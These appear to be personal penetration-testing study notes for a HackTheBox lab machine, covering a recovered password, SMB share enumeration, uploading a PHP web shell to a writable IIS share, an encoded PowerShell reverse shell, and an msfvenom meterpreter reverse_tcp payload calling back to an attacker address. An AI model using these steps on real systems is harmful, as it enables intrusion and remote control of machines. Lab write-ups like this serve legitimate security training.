We got access as `tyler`from [[PNPT/WPE/Windows Subsystem for Linux/Initial Foothold|Initial Foothold]]

# Notes from Tyler
---
![[Pasted image 20250414140533.png]]
- Possible Password: `92g!mA8BGjOirkL%OG*&`
- Something Interesting: `\\secnotes.htb\new-site`
	- This site is not found
	- ![[Pasted image 20250414140615.png]]
- Directory is written in SMB format, let's try that

# SMB Enumeration
---
- `smbclient -L \\\\10.10.10.97\\ -U tyler`
	![[Pasted image 20250414140747.png]]
- Access the shares:
	- ![[Pasted image 20250414141009.png]]
	- These look like default **IIS server files for windows**. We know there is an **IIS server running on port 8808** from nmap scan [[Nmap Scan Results]]
	- We can `put` files
		- ![[Pasted image 20250414141216.png]]
		-  Let's see if we can get a shell by putting an aspx shell here.
			- ASPX shell is never detected, seems like antivirus is preventing those.
		- Uploaded a normal php command shell and **executed base64 encoded powershell to get shell** [[Encoded Powershell Reverse Shell]] from www.revshells.com
		- ![[Pasted image 20250414145511.png]]
		- ![[Pasted image 20250414144642.png]]
		- **Another method is just to upload `nc.exe` and run it from our php command shell.**

# Meterpreter shell
--- 
- Generate and upload `reverse.exe`:
	- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.19 LPORT=9001 -f exe -o reverse.exe`
	- Upload via same `smb` share

# WinPEAS Enumeration
----
- Upload winPEAS via same smb share